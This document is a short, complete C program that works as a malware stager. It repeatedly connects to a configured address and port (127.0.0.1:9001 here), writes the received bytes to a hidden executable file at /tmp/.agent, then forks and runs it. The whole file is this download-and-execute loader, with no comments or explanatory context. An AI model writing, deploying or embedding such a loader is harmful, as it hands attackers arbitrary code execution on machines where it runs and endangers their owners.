#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/stat.h>

int main() {
    const char* target_ip = "127.0.0.1";
    int port = 9001;
    const char* path = "/tmp/.agent";
    char buffer[4096];
    ssize_t bytes_received;

    while (1) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            sleep(5);
            continue;
        }

        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(s);
            sleep(5);
            continue;
        }

        int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
        if (fd < 0) {
            close(s);
            return 1;
        }
        while ((bytes_received = recv(s, buffer, sizeof(buffer), 0)) > 0) {
            write(fd, buffer, bytes_received);
        }

        close(fd);
        close(s);

        struct stat st;
        if (stat(path, &st) == 0 && st.st_size > 0) {
            pid_t pid = fork();
            if (pid == 0) {
                execl(path, path, NULL);
                exit(1); 
            }
            return 0; 
        }

        sleep(5);
    }
    return 0;
}